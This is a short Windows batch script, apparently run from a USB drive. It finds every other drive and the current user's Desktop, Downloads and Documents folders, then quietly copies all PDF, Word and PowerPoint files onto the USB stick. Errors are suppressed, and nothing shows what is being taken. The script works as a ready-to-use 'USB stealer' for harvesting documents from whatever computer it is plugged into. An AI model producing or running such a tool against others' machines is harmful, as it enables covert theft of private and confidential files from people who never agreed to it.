@echo off
setlocal enabledelayedexpansion

set "extensions=.pdf .pptx .ppt .docx .doc"

set "destination=%~dp0Files"

if not exist "%destination%" mkdir "%destination%"

for %%P in ("%~d0") do set "usb_drive=%%~P"

echo USB drive letter: %usb_drive%

for /f %%D in ('wmic logicaldisk get caption ^| findstr /r "[A-Z]:"') do (
    if /i not "%%D"=="%usb_drive%" if /i not "%%D"=="C:" (
        echo copying from %%D
        for %%E in (%extensions%) do (
            xcopy "%%D\*%%~nxE" "%destination%" /s /i /y /d 2>nul
        )
    )
)


for %%F in ("Desktop" "Downloads" "Documents") do (
    echo copying from %%F
    for %%E in (%extensions%) do (
        xcopy "%USERPROFILE%\%%F\*%%~nxE" "%destination%\%%F\" /s /i /y /d 2>nul
    )
)

echo All files copied to USB.

:end
